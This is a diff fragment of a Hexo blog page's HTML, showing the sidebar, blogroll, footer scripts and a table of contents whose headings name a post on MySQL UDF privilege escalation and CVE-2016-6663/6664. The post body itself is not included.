+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">98</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">18</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">112</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql提权方式"><span class="nav-number">1.</span> <span class="nav-text">mysql提权方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#udf提权"><span class="nav-number">2.</span> <span class="nav-text">udf提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是udf："><span class="nav-number">2.1.</span> <span class="nav-text">什么是udf：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#提权原理："><span class="nav-number">2.2.</span> <span class="nav-text">提权原理：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞复现:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用sqlmap进行UDF提权"><span class="nav-number">2.3.1.</span> <span class="nav-text">利用sqlmap进行UDF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用msf进行UDF提权"><span class="nav-number">2.3.2.</span> <span class="nav-text">利用msf进行UDF提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#手动提权"><span class="nav-number">2.3.3.</span> <span class="nav-text">手动提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bypass360"><span class="nav-number">2.3.4.</span> <span class="nav-text">bypass360</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-6663和CVE-2016-6664提权"><span class="nav-number">3.</span> <span class="nav-text">CVE-2016-6663和CVE-2016-6664提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql提升为root权限"><span class="nav-number">3.1.</span> <span class="nav-text">mysql提升为root权限</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
